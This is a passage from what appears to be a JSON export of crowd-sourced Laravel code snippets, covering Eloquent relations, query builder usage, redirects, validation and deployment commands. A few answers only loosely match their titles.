    "description": "create this directories: storage/framework/sessions storage/framework/views storage/framework/cache\nEnsure the below folders in storage directory:  logs framework framework/cache framework/cache/data framework/sessions framework/testing framework/views\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2573,
    "keyword": null,
    "link": null,
    "title": " laravel policy create",
    "description": "php artisan make:policy PostPolicy --model=Post\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2574,
    "keyword": null,
    "link": null,
    "title": " laravel polymorphic model",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Image extends Model {     /**      * Get the owning imageable model.      */     public function imageable()     {         return $this->morphTo();     } }  class Post extends Model {     /**      * Get the post's image.      */     public function image()     {         return $this->morphOne('App\\Image', 'imageable');     } }  class User extends Model {     /**      * Get the user's image.      */     public function image()     {         return $this->morphOne('App\\Image', 'imageable');     } }\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2575,
    "keyword": null,
    "link": null,
    "title": " laravel previous url",
    "description": "{{ URL::previous() }} \n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\nis work {{Request::path()}} or request()->path() \n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2576,
    "keyword": null,
    "link": null,
    "title": " laravel print exception message",
    "description": "@if(count($errors) > 0 ) <div class=\"alert alert-danger alert-dismissible fade show\" role=\"alert\">     <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">         <span aria-hidden=\"true\">&times;</span>     </button>     <ul class=\"p-0 m-0\" style=\"list-style: none;\">         @foreach($errors->all() as $error)         <li>{{$error}}</li>         @endforeach     </ul> </div> @endif\necho $e->getMessage();\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2577,
    "keyword": null,
    "link": null,
    "title": " laravel print executed query",
    "description": "DB::enableQueryLog(); $users = User::select(\"*\")->get(); $quries = DB::getQueryLog(); dd($quries); DB::table('users')->toSql(); dd($query);\nPrint Query in Laravel\n",
    "reg_date": "2021-10-12T10:16:30.000Z"
  },
  {
    "id": 2578,
    "keyword": null,
    "link": null,
    "title": " laravel print query with parameters",
    "description": "DB::enableQueryLog(); $users = User::select(\"*\")->get(); $quries = DB::getQueryLog(); dd($quries); DB::table('users')->toSql(); dd($query);\n$query = str_replace(array('?'), array('\\'%s\\''), $builder->toSql()); $query = vsprintf($query, $builder->getBindings()); dump($query);\nDB::enableQueryLog(); // Enable query log  // Your Eloquent query executed by using get()  dd(DB::getQueryLog()); // Show results of log \n/**  * Combines SQL and its bindings  *  * @param \\Eloquent $query  * @return string  */ public static function getEloquentSqlWithBindings($query) {     return vsprintf(str_replace('?', '%s', $query->toSql()), collect($query->getBindings())->map(function ($binding) {         $binding = addslashes($binding);         return is_numeric($binding) ? $binding : \"'{$binding}'\";     })->toArray()); }\nPrint Query in Laravel\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2579,
    "keyword": null,
    "link": null,
    "title": " laravel production",
    "description": "composer install --optimize-autoloader --no-dev\nApply changes to .env file: APP_ENV=production APP_DEBUG=false Make sure that you are optimizing Composer's class autoloader map (docs): composer dump-autoload --optimize or along install: composer install --optimize-autoloader --no-dev or during update: composer update --optimize-autoloader Optimizing Configuration Loading:  php artisan config:cache Optimizing Route Loading  php artisan route:cache Compile all of the application's Blade templates: php artisan view:cache Cache the framework bootstrap files:  php artisan optimize (Optional) Compiling assets (docs):  npm run production (Optional) Generate the encryption keys Laravel Passport needs (docs):  php artisan passport:keys (Optional) Start Laravel task scheduler by adding the following Cron entry (docs):  * * * * * cd /path-to-your-project && php artisan schedule:run >> /dev/null 2>&1 (Optional) Install, config and start the Supervisor (docs):  (Optional) Create a symbolic link from public/storage to storage/app/public (docs): php artisan storage:link Laravel deployment docs: https://laravel.com/docs/master/deployment Digital Ocean's tutorial: How to Install and Configure Laravel\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2580,
    "keyword": null,
    "link": null,
    "title": " laravel profile migration tool",
    "description": "php artisan migrate:refresh  php artisan migrate:refresh --seed\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2581,
    "keyword": null,
    "link": null,
    "title": " laravel project editor",
    "description": "1) PHP Storm (30 days free)     https://www.jetbrains.com/phpstorm/download 2) Sublime Text (Free)    https://www.sublimetext.com/download 3) Netbeans (Free)    https://netbeans.apache.org/download/index.html 4) Atom (Free)    https://atom.io/ 5) CodeLobster ()    http://www.codelobster.com/download.html\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2582,
    "keyword": null,
    "link": null,
    "title": " laravel project htaccess redirect to public path",
    "description": "//In your Root directory create a file .htaccess and write it  RewriteEngine on RewriteCond %{REQUEST_URI} !^public RewriteRule ^(.*)$ public/$1 [L]   \n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2583,
    "keyword": null,
    "link": null,
    "title": " laravel public stubs",
    "description": "php artisan stub:publish\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2584,
    "keyword": null,
    "link": null,
    "title": " laravel query builder data insert",
    "description": "use Illuminate\\Support\\Facades\\DB;//use it above use Illuminate\\Support\\Facades\\Hash;   //Hash for password || use it above  public function create(Request $request)     {         DB::table('students')->insert([             'email' =>  $request->email,             'password' =>  Hash::make($request->password),             'address' =>  $request->address,             'address2' =>  $request->address2,             'city' =>  $request->city,             'country' =>  $request->country,             'zip' =>  $request->zip,         ]);         return redirect('create');     }\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2585,
    "keyword": null,
    "link": null,
    "title": " laravel query builder get data as array of array",
    "description": "$array = get_object_vars($result); \n$array = json_decode(json_encode($result), true); \n$result = array_map(function ($value) {     return (array)$value; }, $result);\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2586,
    "keyword": null,
    "link": null,
    "title": " laravel query builder get last insert id",
    "description": "$id = DB::table('users')->insertGetId(     ['email' => 'john@example.com', 'votes' => 0] );\n$id = DB::table('users')    ->insertGetId(  \t  ['name' => 'Akash Savani', 'email'=>'akash@gmail.com']  );\nLaravel get last id\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2587,
    "keyword": null,
    "link": null,
    "title": " laravel query builder join",
    "description": "use Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n $customer = DB::table('customers')                 ->join('shops', 'customers.shop_id', '=', 'shops.shop_id')                 ->where('customer_contact', $contact_no)                 ->get();\nDB::select('SELECT * FROM users WHERE name = ?', array(Input::get('name'))); \n ->leftJoin('table3 AS c', function($join){         $join->on('a.field2', '=', 'c.field2')         ->where('a.field2', '=', true)         ->where('a.field3', '=', 'c.field3'); })\n$users = DB::table('users')                 ->groupBy('account_id')                 ->having('account_id', '>', 100)                 ->get();\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2588,
    "keyword": null,
    "link": null,
    "title": " laravel query builder select",
    "description": " DB::table('user')->whereIn('id', [100,200])->get();\n DB::table('user')->where('email', $userEmail)->update(array('member_type' => $plan));   \nuse Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->select('name', 'email as user_email')             ->get();\n$query = DB::table('table')->whereIn('some_field', [1,2,30]);  $sql = $query->toSql();  $bindings = $query->getBindings(); \n$email = DB::table('users')->where('name', 'John')->value('email');\nuse Illuminate\\Database\\Eloquent\\Builder;  public function scopeFakePersons(Builder $query): Builder {   return $query->where('is_fake', 1); }\n",
    "reg_date": "2021-10-12T10:16:31.000Z"
  },
  {
    "id": 2589,
    "keyword": null,
    "link": null,
    "title": " laravel query builder sum",
    "description": "Sometime for such queries you need to disable the strict check  So inside config/database.php and inside mysql,   Set 'strict' => false,  ->select('user_id', DB::raw('SUM(points) as total_points'))\n$purchases = DB::table('transactions')     ->join('categories', 'transactions.category_id', '=', 'categories.id')     ->where('categories.kind', '=', 1)     ->sum('transactions.amount'); \n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2590,
    "keyword": null,
    "link": null,
    "title": " laravel query get big table records",
    "description": "#METHOD 1 DB::table('users')->orderBy('id')->chunk(100, function ($users) {     foreach ($users as $user) {         //     } });  #METHOD 2 foreach (DB::table('users')->orderBy('id')->cursor() as $flight) {     // }\n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2591,
    "keyword": null,
    "link": null,
    "title": " laravel query not null",
    "description": "DB::table('users')\t->whereNotNull('name')\t->get();\nModel::whereNotNull('sent_at')\nDB::table('users')\t->whereNull('name')\t->get();\n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2592,
    "keyword": null,
    "link": null,
    "title": " laravel query order by relation",
    "description": "$users = User::with(['student' => function ($q) {             $q->orderBy('id', 'desc');         }]);\n$order = 'desc'; $users = User::join('roles', 'users.role_id', '=', 'roles.id')->orderBy('roles.label', $order)->select('users.*')->paginate(10); \n$counties = County::whereHas('items', function ($query) {     $query->where('approved', 1); })->orderBy('name')->get();\n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2593,
    "keyword": null,
    "link": null,
    "title": " laravel query relationship nested",
    "description": "return Event::with(['city.companies.persons' => function ($query) {     $query->select('id', '...'); }])->get(); \nreturn Event::with('city.companies.persons')->get(); \n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2594,
    "keyword": null,
    "link": null,
    "title": " laravel query with trashed",
    "description": "$affected = DB::table('users')               ->where('id', 1)               ->update(['votes' => 1]);\n$user->roles()->withTrashed()->get();\n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2595,
    "keyword": null,
    "link": null,
    "title": " laravel queue work schedule cpanel",
    "description": "// step 1 /usr/local/bin/php /home/USERNAME/public_html/PROJECT_FOLDER/artisan schedule:run >> /dev/null 2>&1 // step 2   in kernel.php $schedule->command('queue:work', [ '--max-time' => 300 ])->withoutOverlapping(); // step 3 test it. ;)\n",
    "reg_date": "2021-10-12T10:16:32.000Z"
  },
  {
    "id": 2596,
    "keyword": null,
    "link": null,
    "title": " laravel random column with limit",
    "description": "Model::select('column')     ->where('column','value')     ->inRandomOrder()     ->limit(2) // here is yours limit     ->get();\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2597,
    "keyword": null,
    "link": null,
    "title": " laravel random query",
    "description": "Model::select('column')->where('column','value')->inRandomOrder()     ->limit(2) // here is yours limit     ->get();  ------------------ OR --------------------  Model::inRandomOrder()->select('column')->where('column','value')->first();\nUser::all()->random(); User::all()->random(10); // The amount of items you wish to receive\nUser::inRandomOrder()->limit(5)->get();\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2598,
    "keyword": null,
    "link": null,
    "title": " laravel random value from array",
    "description": "$k = array_rand($array); $v = $array[$k]; \n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2599,
    "keyword": null,
    "link": null,
    "title": " laravel read file from tmp",
    "description": "what ?\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2600,
    "keyword": null,
    "link": null,
    "title": " laravel read json file from storage",
    "description": "$path = storage_path() . \"/json/${filename}.json\"; // ie: /var/www/laravel/app/storage/json/filename.json  $json = json_decode(file_get_contents($path), true);  \n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2601,
    "keyword": null,
    "link": null,
    "title": " laravel read origanl value before update",
    "description": "$model->getOriginal('attribute')\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2602,
    "keyword": null,
    "link": null,
    "title": " laravel realation with has",
    "description": "        $surgeries = SurgeryRoom::has('surgery')->get(); \n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2603,
    "keyword": null,
    "link": null,
    "title": " laravel redirect back",
    "description": "return Redirect::back()->withErrors(['msg', 'The Message']);  and inside your view call this  @if($errors->any()) <h4>{{$errors->first()}}</h4> @endif\n// Laravel 5 return redirect()->back()->withInput(); // Laravel 6,7, 8 return back()->withInput();\nreturn redirect()->back()->withInput(); \nRoute::post('user/profile', function () {     // Update the user's profile...      return redirect('dashboard')->with('status', 'Profile updated!'); });\n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\nreturn back();  return redirect()->back();  return redirect()->previous(); \n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2604,
    "keyword": null,
    "link": null,
    "title": " laravel redirect back with errors and input",
    "description": "return redirect()->back()->withInput(); \nRoute::post('user/profile', function () {     // Update the user's profile...      return redirect('dashboard')->with('status', 'Profile updated!'); });\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2605,
    "keyword": null,
    "link": null,
    "title": " laravel redirect back with input",
    "description": "return Redirect::back()->withErrors(['msg', 'The Message']);  and inside your view call this  @if($errors->any()) <h4>{{$errors->first()}}</h4> @endif\n// Laravel 5 return redirect()->back()->withInput(); // Laravel 6,7, 8 return back()->withInput();\nreturn redirect()->back()->withInput(); \nreturn back();  return redirect()->back();  return redirect()->previous(); \n{{ url()->previous() }}\n",
    "reg_date": "2021-10-12T10:16:33.000Z"
  },
  {
    "id": 2606,
    "keyword": null,
    "link": null,
    "title": " laravel redirect external url",
    "description": "return redirect()->away('https://www.google.com'); \n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2607,
    "keyword": null,
    "link": null,
    "title": " laravel redirect to previous page",
    "description": "url()->previous()\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2608,
    "keyword": null,
    "link": null,
    "title": " laravel redirect with message to section",
    "description": "Route::post('user/profile', function () {     // Update the user's profile...      return redirect('dashboard')->with('status', 'Profile updated!'); });\n//redirct to previous page with message at a specific setion :) return redirect(url()->previous() .'#comments')->with('success', 'Data Your Comment has been created successfully');\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2609,
    "keyword": null,
    "link": null,
    "title": " laravel refresh csrf token",
    "description": "<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\" />  <script type=\"text/javascript\"> $.ajaxSetup({     headers: {         'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')     } }); </script>\npublic function refreshCSRFToken() {     session()->regenerate();     return response()->json(['token' => csrf_token()]); }  <script>     setInterval(function () {       $.ajax({         url: \"{{ route('updateCSRF') }}\",         type: 'get',         dataType: 'json',         success: function (result) {           $('meta[name=\"csrf-token\"]').attr('content', result.token);           $('input[name=\"_token\"]').val(result.token)             $.ajaxSetup({               headers: {                 'X-CSRF-TOKEN': result.token                 }             });         },         error: function (xhr, status, error) {           console.log(xhr);         }       });     }, 15 * (60 * 1000)) </script>\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2610,
    "keyword": null,
    "link": null,
    "title": " laravel refresh server",
    "description": "php artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache \n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2611,
    "keyword": null,
    "link": null,
    "title": " laravel relation has one",
    "description": "// User model public function phone() {   return $this->hasOne(Phone::class); }  // User controller $phone = User::find(1)->phone;\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2612,
    "keyword": null,
    "link": null,
    "title": " laravel relation of relation",
    "description": "//Multiple relationships: $books = Book::with('author', 'publisher')->get();  //Nested relationships: $books = Book::with('author.contacts')->get();\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2613,
    "keyword": null,
    "link": null,
    "title": " laravel relation one to one",
    "description": "// User model public function phone() {   return $this->hasOne(Phone::class); }  // User controller $phone = User::find(1)->phone;\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class User extends Model {     /**      * Get the phone associated with the user.      */     public function phone()     {         return $this->hasOne(Phone::class);     } }\n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2614,
    "keyword": null,
    "link": null,
    "title": " laravel relation select fields",
    "description": "public function user() {     return $this->belongsTo('User')->select(['id', 'username']); } \n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2615,
    "keyword": null,
    "link": null,
    "title": " laravel relationship with for single data",
    "description": "User::with('user_profile')->where('id',$user_id)->first(); \nUser::with('user_profile')->get(); \n",
    "reg_date": "2021-10-12T10:16:34.000Z"
  },
  {
    "id": 2616,
    "keyword": null,
    "link": null,
    "title": " laravel remove apostrophe variables",
    "description": "{{ str_replace('\\'', '', $subcategory->name) }} // eg Kid's\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2617,
    "keyword": null,
    "link": null,
    "title": " laravel remove controller",
    "description": "delete the file  if you already have routes to it remove them to\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2618,
    "keyword": null,
    "link": null,
    "title": " laravel remove cookie",
    "description": "Set cookie: Cookie::queue(Cookie::make('cookieName', 'value', $minutes));  Get cookie: $value = $request->cookie('cookieName');  or $value = Cookie::get('cookieName');  Forget/remove cookie: Cookie::queue(Cookie::forget('cookieName'));  Check if cookie exist: Cookie::has('cookiename');  or $request->hasCookie('cookiename') will return true or false  For more detail, you can refer to the documentation:  https://laravel.com/docs/5.7/requests#cookies https://laravel.com/api/5.7/Illuminate/Contracts/Cookie/Factory.html\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2619,
    "keyword": null,
    "link": null,
    "title": " laravel remove duplicates from array",
    "description": "$array = array(1, 2, 2, 3); $array = array_unique($array); // Array is now (1, 2, 3) \n$users = Users::all(); $usersUnique = $users->unique('id'); $usersDupes = $users->diff($usersUnique);  dd($users, $usersUnique, $usersDupes);\n$unique = $collection->unique();\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2620,
    "keyword": null,
    "link": null,
    "title": " laravel remove foreign key",
    "description": "Schema::table('posts', function (Blueprint $table) { \t$table->dropForeign(['category_id']); });\n$table->dropForeign('posts_user_id_foreign');\n$table->dropIndex(['state']); // Drops index 'geo_state_index'\n$table->dropPrimary('users_id_primary');\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2621,
    "keyword": null,
    "link": null,
    "title": " laravel remove public from url",
    "description": "RewriteEngine On  RewriteCond %{REQUEST_FILENAME} -d [OR] RewriteCond %{REQUEST_FILENAME} -f RewriteRule ^ ^$1 [N]  RewriteCond %{REQUEST_URI} (\\.\\w+$) [NC] RewriteRule ^(.*)$ public/$1   RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ server.php\nRewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2622,
    "keyword": null,
    "link": null,
    "title": " laravel rename column name",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2623,
    "keyword": null,
    "link": null,
    "title": " laravel rename table",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\npublic function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\npublic function down() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('user_id', 'author_ID');     }); } \nSchema::rename($currentTableName, $newTableName);\n$table->string('foo')->nullable(false)->change();\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2624,
    "keyword": null,
    "link": null,
    "title": " laravel request",
    "description": "Try to use the following: \\Request::getRequestUri()\n    public function store(Request $request)     {         $name = $request->input('name');          //     }\nif ($request->has('name')) {     // } \n$myRequest = new \\Illuminate\\Http\\Request(); $myRequest->setMethod('POST'); //default METHOD $myRequest->request->add(['foo' => 'bar']); dd($request->foo);\n<?php  namespace App\\Http\\Controllers;  use Illuminate\\Http\\Request;  class UserController extends Controller {     /**      * Store a new user.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return \\Illuminate\\Http\\Response      */     public function store(Request $request)     {         $name = $request->input('name');          //     } }\n$client = new GuzzleHttp\\Client(); $res = $client->get('https://api.github.com/user', ['auth' =>  ['user', 'pass']]); echo $res->getStatusCode(); // 200 echo $res->getBody(); // { \"type\": \"User\", ....\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2625,
    "keyword": null,
    "link": null,
    "title": " laravel request add key value",
    "description": "$request->request->add(['variable' => 'value']); //add request  \n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2626,
    "keyword": null,
    "link": null,
    "title": " laravel request all except",
    "description": "$request->only('username', 'password'); or $request->except('_method', '_token');\n$request->input('name'); $request->input('user.name'); // fetch from user object\n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2627,
    "keyword": null,
    "link": null,
    "title": " laravel request integer",
    "description": "$rules = ['Fno' => 'numeric|min:2|max:5', 'Lno' => 'numeric|min:2']; \n$init_page = Input::get('initial_page');  $rules = [     'initial_page' => 'required_with:end_page|integer|min:1|digits_between: 1,5',     'end_page' => 'required_with:initial_page|integer|min:'. ($init_page+1) .'|digits_between:1,5' ];  \n",
    "reg_date": "2021-10-12T10:16:35.000Z"
  },
  {
    "id": 2628,
    "keyword": null,
    "link": null,
    "title": " laravel request rule",
    "description": "<?php  namespace App\\Http\\Requests;  use Illuminate\\Foundation\\Http\\FormRequest; use Illuminate\\Validation\\Rule;  class StarShopRequest extends FormRequest {     /**      * Get the validation rules that apply to the request.      *      * @return array      */     public function rules()     {         return [             'number' => [                 'required',                 Rule::in([1, 11, 20, 35])             ]         ];     }  }\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2629,
    "keyword": null,
    "link": null,
    "title": " laravel require vendor autoload",
    "description": "//Try to run either: \tcomposer install //or     composer update \n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2630,
    "keyword": null,
    "link": null,
    "title": " laravel required if",
    "description": "\"sale_price\" => \"required_if:list_type,==,selling\" \n        $request->validate([             'daily_movement_id'=>'required_with:daily_movement',             'daily_movement'=>'required_with:daily_movement_id',         ]); //////////////////////////////////////////////////////         $request->validate([             'daily_movement_id'=>'required_without:daily_movement',             'daily_movement'=>'required_without:daily_movement_id',         ]);\npublic function rules()  {     return [       'reclamo_procede'  => 'max:1',                    'solucion_minutos' => 'required_if:reclamo_procede,==,si',      ];  }\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2631,
    "keyword": null,
    "link": null,
    "title": " laravel required if another field has value",
    "description": "'last_name' => 'required_if:another_field,value'\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2632,
    "keyword": null,
    "link": null,
    "title": " laravel response json if not authorized",
    "description": ">>> add this function in app/Exceptions/Handler.php  use Illuminate\\Auth\\AuthenticationException; use Illuminate\\Http\\Request; use Illuminate\\Http\\Response;  /**  * Convert an authentication exception into an unauthenticated response.  *  * @param  \\Illuminate\\Http\\Request  $request  * @param  \\Illuminate\\Auth\\AuthenticationException  $exception  * @return \\Illuminate\\Http\\Response  */ protected function unauthenticated($request, AuthenticationException $exception) {     return response()->json(['error' => 'Unauthenticated!'], 401); }\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2633,
    "keyword": null,
    "link": null,
    "title": " laravel response redirect",
    "description": "#Method 1 with route name return redirect()->route('login');  #Method 2 back with input return back()->withInput();  #Method 2 using a url return redirect('/home/dashboard');\n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', [$user]);\n// For a route with the following URI: profile/{id}  return redirect()->route('profile', ['id' => 1]);\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2634,
    "keyword": null,
    "link": null,
    "title": " laravel restore soft delete",
    "description": "To also get soft deleted models :   $trashedAndNotTrashed = Model::withTrashed()->get();  Only soft deleted models in your results :   $onlySoftDeleted = Model::onlyTrashed()->get();\nPost::withTrashed()->find($post_id)->restore(); \n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\n$flight->restore();\n$flights = Flight::where('active', 1)                ->orderBy('name')                ->take(10)                ->get();\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2635,
    "keyword": null,
    "link": null,
    "title": " laravel return back with success",
    "description": "return redirect()->back()->with('message', 'IT WORKS!');  Displaying message if it exists:  @if(session()->has('message'))     <div class=\"alert alert-success\">         {{ session()->get('message') }}     </div> @endif\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2636,
    "keyword": null,
    "link": null,
    "title": " laravel return redirect to named route",
    "description": "Route::redirect('/here', '/there'); or return redirect(route('register'));\nreturn redirect()->route('login');\n1. The cleanest way seems to be using the url() helper: \t{{ url()->previous() }}  2. URL::previous() works for me in my Laravel 5.1 project. Here is Laravel 5.1    doc for previous() method, which is accessible through URL Facade.  3. You can still try alternatives, in your views you can do:  \t{{ redirect()->getUrlGenerator()->previous() }} \t\t\t\t\t\tOR \t{{ redirect()->back()->getTargetUrl() }}\nRoute::post('/user/profile', function () {     // Update the user's profile...      return redirect('/dashboard')->with('status', 'Profile updated!'); });\n",
    "reg_date": "2021-10-12T10:16:36.000Z"
  },
  {
    "id": 2637,
    "keyword": null,
    "link": null,
    "title": " laravel return validation errors",
    "description": "@if($errors->any())     <div class=\"alert alert-danger\">         <p><strong>Opps Something went wrong</strong></p>         <ul>         @foreach ($errors->all() as $error)             <li>{{ $error }}</li>         @endforeach         </ul>     </div> @endif  @if(session('success'))     <div class=\"alert alert-success\">{{session('success')}}</div> @endif  @if(session('error'))     <div class=\"alert alert-danger\">{{session('error')}}</div> @endif \n@if($errors->has())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\n @if ($errors->any())      @foreach ($errors->all() as $error)          <div>{{$error}}</div>      @endforeach  @endif \nif (request('event') == null) {     $validator->errors()->add('event', 'Please select an event'); }\npublic function testAjax(Request $request)   {     $name = $request->input('name');     $validator = Validator::make($request->all(), ['name' => 'required']);      if ($validator->fails()){         $errors = $validator->errors();         echo $errors;     }     else{       echo \"welcome \". $name;     }    } \n@if($errors->any())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2638,
    "keyword": null,
    "link": null,
    "title": " laravel route controller",
    "description": "php artisan make:controller MyController\nuse App\\Http\\Controllers\\UserController;  Route::get('user/{id}', [UserController::class, 'show']);\nRoute::resources([     'photos' => 'PhotoController',     'posts' => 'PostController', ]);\nclass UserController extends Controller {     /**      * Instantiate a new controller instance.      *      * @return void      */     public function __construct()     {         $this->middleware('auth');          $this->middleware('log')->only('index');          $this->middleware('subscribed')->except('store');     } }\nVerb          Path                        Action  Route Name GET           /users                      index   users.index GET           /users/create               create  users.create POST          /users                      store   users.store GET           /users/{user}               show    users.show GET           /users/{user}/edit          edit    users.edit PUT|PATCH     /users/{user}               update  users.update DELETE        /users/{user}               destroy users.destroy\n//in the terminal run composer dump-autoload\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2639,
    "keyword": null,
    "link": null,
    "title": " laravel route list",
    "description": "php artisan route:list\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2640,
    "keyword": null,
    "link": null,
    "title": " laravel route param blade",
    "description": "<a class=\"nav-link\" href=\" {{ route('profiles.show',$logged_user) }}\">\n",
    "reg_date": "2021-10-12T10:16:37.000Z"
  },
  {
    "id": 2641,
    "keyword": null,
    "link": null,
    "title": " laravel route pattern",
